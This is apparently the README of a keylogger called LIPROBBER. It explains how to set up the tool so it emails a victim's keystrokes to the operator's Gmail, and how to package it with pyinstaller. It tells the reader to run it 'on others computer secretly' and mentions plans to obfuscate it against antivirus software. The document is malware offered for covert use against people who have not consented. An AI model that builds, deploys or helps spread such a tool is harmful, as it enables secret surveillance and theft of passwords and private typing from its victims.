# LIPROBBER
This keylogger sends key values victim pressed to your gmail.

*This tool infects target pc.

---

# Usage

1. You need to create your app password first.

2. Then write your app password and gmail in these code..
      -sendemail.py
        
        line 25, msg['To'] = 'your gmail'
        line 26, msg['From'] = 'your gmail'
        
        line 43, server.login('your gmail', 'your app password')

3. Save sendemail.py

4. Thats it, you need to convert three python files(LIPROBBER-0220.py, keyloggerv4.py, sendemail.py) to execution files using pyinstaller -w -F [filename.py]

5. Then all set, To run these, the exe files should be in same folder.



But the problem is software keyloggers get caught by computer vaccine very easily.


I'll study about how to obfuscate code.

# HOW TO RUN IT
 - Run LIPROBBER-0220.exe(converted to exe file) on others computer secretly.
